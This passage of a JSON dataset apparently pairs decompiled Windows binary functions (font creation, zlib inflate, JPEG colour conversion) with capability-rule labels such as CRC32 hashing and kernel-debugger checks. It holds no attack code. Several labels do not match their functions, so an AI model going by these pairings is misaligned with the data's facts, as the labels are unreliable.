        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00427c79)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00427b88(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x427da4;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x427dab;\n        uStack104 = 0x427da3;\n        fcn.00405490();\n        return;\n    }\n    puStack112 = 0x427bcc;\n    fcn.00426e68();\n    uStack116 = 0x427d7c;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n        var_2ch._3_1_ = *(var_4h + 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x4a1cf2 != '\\x01')) {\n            var_2ch._3_1_ = *0x4a1cf2;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.004056d0();\n        uVar2 = fcn.004058fc(*0x427db8);\n        fcn.004056d0(0, uVar2);\n        uVar2 = fcn.004058fc();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.004056d0();\n            fcn.0040a824();\n        }\n        else {\n            fcn.004056d0();\n            fcn.0040a824();\n        }\n        if (((**0x4a5164 == 1) && (cVar1 = fcn.0042ec3c(),  cVar1 == -0x80)) && (cVar1 = fcn.00427b5c(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00427f00();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.00427b88::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.00426e74(0x427d83);\n    return;\n}\n",
        "token_count": 1160
    },
    "00428c3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428c3c(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x428cb0 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040dab4();\n                fcn.00404eb4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.00428cdc();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.00428d08();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.00428d38();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "004362f8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004362f8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    if (in_ECX < arg_8h) {\n        iVar2 = fcn.004361ac(arg_8h);\n        if (iVar2 == 0) {\n            return 0xffffffff;\n        }\n        var_8h = *(in_EAX + 8);\n        in_ECX = *(in_EAX + 0xc);\n    }\n    iVar2 = in_ECX - arg_8h;\n    uVar3 = var_8h >> (iVar2 & 0x1f) & (1 << (arg_8h & 0x1f)) - 1U;\n    var_ch = arg_ch + arg_8h * 4;\n    do {\n        if (uVar3 <= *var_ch) {\n            *(in_EAX + 8) = var_8h;\n            *(in_EAX + 0xc) = iVar2;\n            if (arg_8h < 0x11) {\n                uVar3 = *(*(arg_ch + 0x8c) + uVar3 + 0x11 + *(arg_ch + 0x48 + arg_8h * 4));\n            }\n            else {\n                piVar1 = *(in_EAX + 0x10);\n                *(*piVar1 + 0x14) = 0x76;\n                (**(*piVar1 + 4))();\n                uVar3 = 0;\n            }\n            return uVar3;\n        }\n        if (iVar2 < 1) {\n            iVar2 = fcn.004361ac(1);\n            if (iVar2 == 0) {\n                return 0xffffffff;\n            }\n            var_8h = *(in_EAX + 8);\n            iVar2 = *(in_EAX + 0xc);\n        }\n        iVar2 = iVar2 + -1;\n        uVar3 = uVar3 * 2 | var_8h >> (iVar2 & 0x1f) & 1U;\n        arg_8h = arg_8h + 1;\n        var_ch = var_ch + 1;\n    } while( true );\n}\n",
        "token_count": 566
    },
    "00436ac0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436ac0(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t *in_EDX;\n    uchar *puVar15;\n    int32_t iVar16;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c4);\n    iVar4 = *(iVar3 + 0x10);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 0x14);\n    iVar7 = *(iVar3 + 0x18);\n    iVar3 = *(iVar3 + 0x1c);\n    puVar8 = *(*in_EDX + in_ECX * 4);\n    puVar9 = *(in_EDX[1] + in_ECX * 4);\n    puVar10 = *(in_EDX[2] + in_ECX * 4);\n    puVar15 = *arg_8h;\n    for (uVar13 = *(in_EAX + 0x70) >> 1; uVar13 != 0; uVar13 = uVar13 - 1) {\n        uVar1 = *puVar9;\n        puVar9 = puVar9 + 1;\n        uVar2 = *puVar10;\n        puVar10 = puVar10 + 1;\n        iVar11 = *(iVar4 + uVar2 * 4);\n        iVar16 = *(iVar3 + uVar1 * 4) + *(iVar7 + uVar2 * 4) >> 0x10;\n        iVar12 = *(iVar6 + uVar1 * 4);\n        uVar14 = *puVar8;\n        puVar15[2] = *(iVar5 + uVar14 + iVar11);\n        puVar15[1] = *(iVar5 + uVar14 + iVar16);\n        *puVar15 = *(iVar5 + uVar14 + iVar12);\n        uVar14 = puVar8[1];\n        puVar8 = puVar8 + 2;\n        puVar15[5] = *(iVar5 + uVar14 + iVar11);\n        puVar15[4] = *(iVar5 + uVar14 + iVar16);\n        puVar15[3] = *(iVar5 + uVar14 + iVar12);\n        puVar15 = puVar15 + 6;\n    }\n    if ((*(in_EAX + 0x70) & 1) != 0) {\n        iVar3 = *(iVar3 + *puVar9 * 4);\n        iVar7 = *(iVar7 + *puVar10 * 4);\n        iVar6 = *(iVar6 + *puVar9 * 4);\n        uVar13 = *puVar8;\n        puVar15[2] = *(iVar5 + uVar13 + *(iVar4 + *puVar10 * 4));\n        puVar15[1] = *(iVar5 + uVar13 + (iVar3 + iVar7 >> 0x10));\n        *puVar15 = *(iVar5 + uVar13 + iVar6);\n    }\n    return;\n}\n",
        "token_count": 865
    },
    "00436c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436c38(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t in_EAX;\n    uchar *puVar14;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c4);\n    iVar4 = *(in_EAX + 0x144);\n    iVar5 = *(iVar3 + 0x10);\n    iVar6 = *(iVar3 + 0x14);\n    iVar18 = *(iVar3 + 0x18);\n    iVar3 = *(iVar3 + 0x1c);\n    puVar7 = *(*in_EDX + in_ECX * 8);\n    puVar8 = *(*in_EDX + 4 + in_ECX * 8);\n    puVar9 = *(in_EDX[1] + in_ECX * 4);\n    puVar10 = *(in_EDX[2] + in_ECX * 4);\n    puVar14 = *arg_8h;\n    puVar11 = arg_8h[1];\n    for (uVar15 = *(in_EAX + 0x70) >> 1; uVar15 != 0; uVar15 = uVar15 - 1) {\n        uVar1 = *puVar9;\n        puVar9 = puVar9 + 1;\n        uVar2 = *puVar10;\n        puVar10 = puVar10 + 1;\n        iVar12 = *(iVar5 + uVar2 * 4);\n        iVar17 = *(iVar3 + uVar1 * 4) + *(iVar18 + uVar2 * 4) >> 0x10;\n        iVar13 = *(iVar6 + uVar1 * 4);\n        uVar16 = *puVar7;\n        puVar14[2] = *(iVar4 + uVar16 + iVar12);\n        puVar14[1] = *(iVar4 + uVar16 + iVar17);\n        *puVar14 = *(iVar4 + uVar16 + iVar13);\n        uVar16 = puVar7[1];\n        puVar7 = puVar7 + 2;\n        puVar14[5] = *(iVar4 + uVar16 + iVar12);\n        puVar14[4] = *(iVar4 + uVar16 + iVar17);\n        puVar14[3] = *(iVar4 + uVar16 + iVar13);\n        puVar14 = puVar14 + 6;\n        uVar16 = *puVar8;\n        puVar11[2] = *(iVar4 + uVar16 + iVar12);\n        puVar11[1] = *(iVar4 + uVar16 + iVar17);\n        *puVar11 = *(iVar4 + uVar16 + iVar13);\n        uVar16 = puVar8[1];\n        puVar8 = puVar8 + 2;\n        puVar11[5] = *(iVar4 + uVar16 + iVar12);\n        puVar11[4] = *(iVar4 + uVar16 + iVar17);\n        puVar11[3] = *(iVar4 + uVar16 + iVar13);\n        puVar11 = puVar11 + 6;\n    }\n    if ((*(in_EAX + 0x70) & 1) != 0) {\n        iVar5 = *(iVar5 + *puVar10 * 4);\n        iVar18 = *(iVar3 + *puVar9 * 4) + *(iVar18 + *puVar10 * 4) >> 0x10;\n        iVar3 = *(iVar6 + *puVar9 * 4);\n        uVar15 = *puVar7;\n        puVar14[2] = *(iVar4 + uVar15 + iVar5);\n        puVar14[1] = *(iVar4 + uVar15 + iVar18);\n        *puVar14 = *(iVar4 + uVar15 + iVar3);\n        uVar15 = *puVar8;\n        puVar11[2] = *(iVar4 + uVar15 + iVar5);\n        puVar11[1] = *(iVar4 + uVar15 + iVar18);\n        *puVar11 = *(iVar4 + uVar15 + iVar3);\n    }\n    return;\n}\n",
        "token_count": 1157
    },
    "004390e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004390e8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    \n    iVar1 = *(in_EAX + 0x1cc);\n    iVar2 = (***(in_EAX + 4))();\n    iVar5 = 0;\n    piVar4 = iVar2 + 0x3fc;\n    uVar3 = 0;\n    *(iVar1 + 0x28) = piVar4;\n    piVar6 = piVar4;\n    do {\n        *piVar6 = iVar5;\n        piVar4[-uVar3] = -iVar5;\n        piVar6 = piVar6 + 1;\n        uVar3 = uVar3 + 1;\n        iVar5 = iVar5 + 1;\n    } while (uVar3 < 0x10);\n    piVar6 = piVar4 + uVar3;\n    while (uVar3 < 0x30) {\n        *piVar6 = iVar5;\n        piVar6 = piVar6 + 1;\n        piVar4[-uVar3] = -iVar5;\n        iVar5 = iVar5 + ((uVar3 + 1 & 1) == 0);\n        uVar3 = uVar3 + 1;\n    }\n    piVar6 = piVar4 + uVar3;\n    for (; uVar3 < 0x100; uVar3 = uVar3 + 1) {\n        *piVar6 = iVar5;\n        piVar6 = piVar6 + 1;\n        piVar4[-uVar3] = -iVar5;\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00448a80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00448a80(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    ushort uVar6;\n    uint8_t **in_EAX;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint8_t *arg_ch;\n    uint8_t *puVar14;\n    uint8_t *puStack48;\n    uint32_t uStack44;\n    uint8_t *puStack36;\n    uint8_t *puStack32;\n    uint uStack28;\n    char cStack24;\n    uint8_t uStack23;\n    int32_t iStack20;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == NULL)) || (in_EAX[3] == NULL)) || ((*in_EAX == NULL && (in_EAX[1] != NULL)))\n       ) {\n        return -2;\n    }\n    piVar2 = in_EAX[7];\n    if (*piVar2 == 3) {\n        *piVar2 = 4;\n    }\n    puVar9 = in_EAX[3];\n    puStack48 = in_EAX[4];\n    puVar3 = in_EAX[1];\n    uStack44 = piVar2[0xd];\n    arg_ch = *in_EAX;\n    uVar13 = piVar2[0xe];\n    iStack20 = 0;\n    puVar14 = puVar3;\n    puStack36 = puStack48;\n    do {\n    // switch table (21 cases) at 0x448b1f\n        switch(*piVar2) {\n        case 0:\n            if (piVar2[2] == 0) {\n                *piVar2 = 4;\n            }\n            else {\n                for (; uVar13 < 0x10; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00449826;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                if (((uStack44 & 0xff) * 0x100 + (uStack44 >> 8)) % 0x1f == 0) {\n                    if ((uStack44 & 0xf) == 8) {\n                        uStack44 = uStack44 >> 4;\n                        uVar13 = uVar13 - 4;\n                        uVar12 = (uStack44 & 0xf) + 8;\n                        if (uVar12 < piVar2[8] || uVar12 == piVar2[8]) {\n                            piVar2[5] = 1 << uVar12;\n                            puVar7 = fcn.0044686c();\n                            piVar2[6] = puVar7;\n                            in_EAX[0xc] = puVar7;\n                            if ((uStack44 & 0x200) == 0) {\n                                iVar8 = 3;\n                            }\n                            else {\n                                iVar8 = 1;\n                            }\n                            *piVar2 = iVar8;\n                            uVar13 = 0;\n                            uStack44 = 0;\n                        }\n                        else {\n                            in_EAX[6] = \"invalid window size\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"unknown compression method\";\n                        *piVar2 = 0x12;\n                    }\n                }\n                else {\n                    in_EAX[6] = \"incorrect header check\";\n                    *piVar2 = 0x12;\n                }\n            }\n            break;\n        case 1:\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00449826;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            puVar7 = (uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000;\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            uVar13 = 0;\n            uStack44 = 0;\n            *piVar2 = 2;\n        case 2:\n            if (piVar2[3] == 0) {\n                in_EAX[3] = puVar9;\n                in_EAX[4] = puStack48;\n                *in_EAX = arg_ch;\n                in_EAX[1] = puVar14;\n                piVar2[0xd] = uStack44;\n                piVar2[0xe] = uVar13;\n                return 2;\n            }\n            puVar7 = fcn.0044686c();\n            piVar2[6] = puVar7;\n            in_EAX[0xc] = puVar7;\n            *piVar2 = 3;\ncode_r0x00448d31:\n            if (param_2 == 5) goto code_r0x00449826;\ncode_r0x00448d3c:\n            if (piVar2[1] == 0) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00449826;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                piVar2[1] = uStack44 & 1;\n                uVar12 = uStack44 >> 1 & 3;\n                if (uVar12 == 0) {\n                    *piVar2 = 5;\n                }\n                else if (uVar12 == 1) {\n                    fcn.0044895c();\n                    *piVar2 = 10;\n                }\n                else if (uVar12 == 2) {\n                    *piVar2 = 7;\n                }\n                else if (uVar12 == 3) {\n                    in_EAX[6] = \"invalid block type\";\n                    *piVar2 = 0x12;\n                }\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            else {\n                uStack44 = uStack44 >> (uVar13 & 7);\n                uVar13 = uVar13 - (uVar13 & 7);\n                *piVar2 = 0x10;\n            }\n            break;\n        case 3:\n            goto code_r0x00448d31;\n        case 4:\n            goto code_r0x00448d3c;\n        case 5:\n            uStack44 = uStack44 >> (uVar13 & 7);\n            for (uVar13 = uVar13 - (uVar13 & 7); uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00449826;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            if ((uStack44 & 0xffff) == (uStack44 >> 0x10 ^ 0xffff)) {\n                piVar2[0xf] = uStack44 & 0xffff;\n                uVar13 = 0;\n                uStack44 = 0;\n                *piVar2 = 6;\n                goto code_r0x00448e53;\n            }\n            in_EAX[6] = \"invalid stored block lengths\";\n            *piVar2 = 0x12;\n            break;\n        case 6:\ncode_r0x00448e53:\n            puStack32 = piVar2[0xf];\n            if (puStack32 == NULL) {\n                *piVar2 = 3;\n            }\n            else {\n                if (puVar14 < puStack32) {\n                    puStack32 = puVar14;\n                }\n                if (puStack48 < puStack32) {\n                    puStack32 = puStack48;\n                }\n                if (puStack32 == NULL) goto code_r0x00449826;\n                fcn.004465c0(puVar9, arg_ch, puStack32);\n                puVar14 = puVar14 + -puStack32;\n                arg_ch = arg_ch + puStack32;\n                puStack48 = puStack48 + -puStack32;\n                puVar9 = puVar9 + puStack32;\n                piVar2[0xf] = piVar2[0xf] - puStack32;\n            }\n            break;\n        case 7:\n            for (; uVar13 < 0xe; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x00449826;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            piVar2[0x17] = (uStack44 & 0x1f) + 0x101;\n            piVar2[0x18] = (uStack44 >> 5 & 0x1f) + 1;\n            piVar2[0x16] = (uStack44 >> 10 & 0xf) + 4;\n            uStack44 = uStack44 >> 0xe;\n            uVar13 = uVar13 - 0xe;\n            if ((piVar2[0x17] < 0x11f) && (piVar2[0x18] < 0x1f)) {\n                piVar2[0x19] = 0;\n                *piVar2 = 8;\n                goto code_r0x00448fa7;\n            }\n            in_EAX[6] = \"too many length or distance symbols\";\n            *piVar2 = 0x12;\n            break;\n        case 8:\ncode_r0x00448fa7:\n            while (piVar2[0x19] < piVar2[0x16]) {\n                for (; uVar13 < 3; uVar13 = uVar13 + 8) {\n                    if (puVar14 == NULL) goto code_r0x00449826;\n                    uVar1 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                    puVar14 = puVar14 + -1;\n                }\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4a3424) * 2 + 0x6c) = uStack44 & 7;\n                uStack44 = uStack44 >> 3;\n                uVar13 = uVar13 - 3;\n            }\n            while (piVar2[0x19] < 0x13) {\n                iVar8 = piVar2[0x19];\n                piVar2[0x19] = piVar2[0x19] + 1;\n                *(piVar2 + *(iVar8 * 2 + 0x4a3424) * 2 + 0x6c) = 0;\n            }\n            piVar2[0x1a] = piVar2 + 0x14b;\n            piVar2[0x12] = piVar2 + 0x14b;\n            piVar2[0x14] = 7;\n            in_EAX = piVar2 + 0xbb;\n            iVar8 = fcn.00449cac(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n            if (iVar8 == 0) {\n                piVar2[0x19] = 0;\n                *piVar2 = 9;\ncode_r0x0044922d:\n                while (piVar2[0x19] <= piVar2[0x17] + piVar2[0x18] && piVar2[0x17] + piVar2[0x18] != piVar2[0x19]) {\n                    while( true ) {\n                        uVar4 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4);\n                        uStack28._1_1_ = uVar4 >> 8;\n                        if (uStack28._1_1_ <= uVar13) break;\n                        if (puVar14 == NULL) goto code_r0x00449826;\n                        uVar1 = *arg_ch;\n                        arg_ch = arg_ch + 1;\n                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                        puVar14 = puVar14 + -1;\n                        uVar13 = uVar13 + 8;\n                    }\n                    uStack28._2_2_ = uVar4 >> 0x10;\n                    if (uStack28._2_2_ < 0x10) {\n                        for (; uVar13 < uStack28._1_1_; uVar13 = uVar13 + 8) {\n                            if (puVar14 == NULL) goto code_r0x00449826;\n                            uVar1 = *arg_ch;\n                            arg_ch = arg_ch + 1;\n                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                            puVar14 = puVar14 + -1;\n                        }\n                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                        uVar13 = uVar13 - uStack28._1_1_;\n                        iVar8 = piVar2[0x19];\n                        piVar2[0x19] = piVar2[0x19] + 1;\n                        *(piVar2 + iVar8 * 2 + 0x6c) = uStack28._2_2_;\n                    }\n                    else {\n                        if (uStack28._2_2_ == 0x10) {\n                            for (; uVar13 < uStack28._1_1_ + 2; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00449826;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar13 = uVar13 - uStack28._1_1_;\n                            if (piVar2[0x19] == 0) {\n                                in_EAX[6] = \"invalid bit length repeat\";\n                                *piVar2 = 0x12;\n                                break;\n                            }\n                            uVar6 = *(piVar2 + piVar2[0x19] * 2 + 0x6a);\n                            puStack32 = (uStack44 & 3) + 3;\n                            uStack44 = uStack44 >> 2;\n                            uVar13 = uVar13 - 2;\n                        }\n                        else if (uStack28._2_2_ == 0x11) {\n                            for (; uVar13 < uStack28._1_1_ + 3; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00449826;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 7) + 3;\n                            uStack44 = uStack44 >> 3;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 3;\n                        }\n                        else {\n                            for (; uVar13 < uStack28._1_1_ + 7; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x00449826;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 0x7f) + 0xb;\n                            uStack44 = uStack44 >> 7;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 7;\n                        }\n                        if (piVar2[0x17] + piVar2[0x18] < piVar2[0x19] + puStack32) {\n                            in_EAX[6] = \"invalid bit length repeat\";\n                            *piVar2 = 0x12;\n                            break;\n                        }\n                        while (puStack32 != NULL) {\n                            iVar8 = piVar2[0x19];\n                            piVar2[0x19] = piVar2[0x19] + 1;\n                            *(piVar2 + iVar8 * 2 + 0x6c) = uVar6;\n                            puStack32 = puStack32 + -1;\n                        }\n                    }\n                }\n                if (*piVar2 != 0x12) {\n                    piVar2[0x1a] = piVar2 + 0x14b;\n                    piVar2[0x12] = piVar2 + 0x14b;\n                    piVar2[0x14] = 9;\n                    in_EAX = piVar2 + 0xbb;\n                    iVar8 = fcn.00449cac(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n                    if (iVar8 == 0) {\n                        piVar2[0x13] = piVar2[0x1a];\n                        piVar2[0x15] = 6;\n                        in_EAX = piVar2 + 0xbb;\n                        uStack44 = fcn.00449cac(in_EAX, piVar2 + 0x15, piVar2 + 0x1a);\n                        if (uStack44 == 0) {\n                            *piVar2 = 10;\ncode_r0x004492f0:\n                            if ((puVar14 < 0x6) || (puStack48 < 0x102)) {\n                                for (; uVar12 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4), \n                                    uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                    if (puVar14 == NULL) goto code_r0x00449826;\n                                    uVar1 = *arg_ch;\n                                    arg_ch = arg_ch + 1;\n                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                    puVar14 = puVar14 + -1;\n                                }\n                                uStack28._0_1_ = uVar12;\n                                uStack28 = uVar12;\n                                if ((uStack28 != '\\0') && ((uVar12 & 0xf0) == 0)) {\n                                    while( true ) {\n                                        uStack23 = uVar12 >> 8;\n                                        uStack28 = *(piVar2[0x12] +\n                                                    ((((1 << (uStack23 + uStack28 & 0x1f)) - 1U & uStack44) >>\n                                                     (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                        if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                        if (puVar14 == NULL) goto code_r0x00449826;\n                                        uVar1 = *arg_ch;\n                                        arg_ch = arg_ch + 1;\n                                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                        puVar14 = puVar14 + -1;\n                                        uVar13 = uVar13 + 8;\n                                    }\n                                    uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                    uVar13 = uVar13 - uStack23;\n                                }\n                                uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                uVar13 = uVar13 - uStack28._1_1_;\n                                piVar2[0xf] = uStack28 >> 0x10;\n                                if (uStack28 == '\\0') {\n                                    *piVar2 = 0xf;\n                                }\n                                else if ((uStack28 & 0x20) == 0) {\n                                    if ((uStack28 & 0x40) == 0) {\n                                        piVar2[0x11] = uStack28 & 0xf;\n                                        *piVar2 = 0xb;\ncode_r0x00449490:\n                                        if (piVar2[0x11] != 0) {\n                                            for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                if (puVar14 == NULL) goto code_r0x00449826;\n                                                uVar1 = *arg_ch;\n                                                arg_ch 